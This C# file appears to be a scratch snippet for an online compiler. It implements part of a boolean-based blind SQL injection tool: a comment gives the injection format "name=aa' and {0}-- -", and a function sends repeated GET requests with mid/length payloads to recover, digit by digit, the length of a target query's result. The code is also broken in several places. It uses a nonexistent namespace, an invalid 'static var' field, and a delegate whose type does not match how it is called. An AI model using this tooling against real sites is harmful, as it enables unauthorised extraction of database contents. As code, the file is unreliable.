using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Task;
using System.Linq;
using System.Text;

public class Test
{
	public static void Main()
	{
		// your code goes here
	}
	
	private static var client = new HttpClient();
	
	private static async Task<string> _get_html(string url){
		string result = null;
		try{ result = await client.GetStringAsync(url); }
		catch(Exception ex){ /*Log & Retry*/ }
		return result ?? "";
	}
	
	// GET, Boolean
	// query_format => name=aa' and {0}-- -
	// target_query => data or select
	public static async Task<int> string_length(string url, string query_format, string target_query, Func<bool, string> check_func) {
		string result_s = "";
		int index = 1;
		while(true){
			string html = null;
			//length check
			string test_url = string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast(length({target_query}) as char),{index},1)=''"));
			html = await _get_html(test_url);
			if(check_func(html))
				break;
			for(int i = 0x30; i < 0x40; i++){
				test_url = string.Format("{0}?{1}", url, string.Format(query_format, $"mid(cast(length({target_query}) as char),{index},1)=0x" + i.ToString("X2")));
				html = await client.GetStringAsync(test_url);
				if(check_func(html)){
					result_s += (char)i;
					break;
				}
			}
			index++;
		}
		return result_s == "" ? 0 : int.Parse(result_s);
	}
}